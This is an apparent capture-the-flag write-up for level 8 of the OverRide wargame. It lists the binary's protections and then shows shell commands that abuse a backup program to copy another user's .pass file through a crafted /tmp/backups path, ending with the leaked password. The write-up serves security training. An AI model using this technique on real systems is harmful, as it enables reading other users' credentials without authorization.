# Level08

## Reconnaissance

We have two security enabled:
- **RELRO Full enabled** = GOT (Global Offset Table) set as read only
- **Canary** = Random value added after the return address, if it is modified, the program leave. Prevent overwrite of return address

ELF 64bit

With gdb, we realise that the binary is creating a backup of the file given as argument in a folder `backups` in relative path.

## Exploit

We can try to create a backup of the level09 `.pass` but we get : `ERROR: Failed to open ./backups//home/users/level09/.pass`
It looks like the program need the folders to create the backup.
Since we cannot create the folders in our home, lets move to `/tmp`
```shell
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```